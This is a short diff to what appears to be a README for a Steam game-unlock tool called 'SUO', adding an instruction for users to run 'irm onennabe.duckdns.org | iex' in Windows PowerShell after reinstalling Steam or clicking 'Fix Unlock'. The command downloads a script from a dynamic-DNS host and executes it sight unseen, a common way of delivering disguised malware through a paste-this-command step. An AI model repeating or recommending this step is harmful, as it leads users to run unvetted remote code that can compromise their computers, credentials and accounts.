@@ -47,3 +47,9 @@ P/S:
 
 
 ![Attached Image](assets/suo-remote_1557071493026811904.gif)
+
+---
+
+When Click **Reinstall steam**/Click **Fix Unlock** at SUO
+
+make sure run ``irm onennabe.duckdns.org | iex`` cmd again at windows powershell
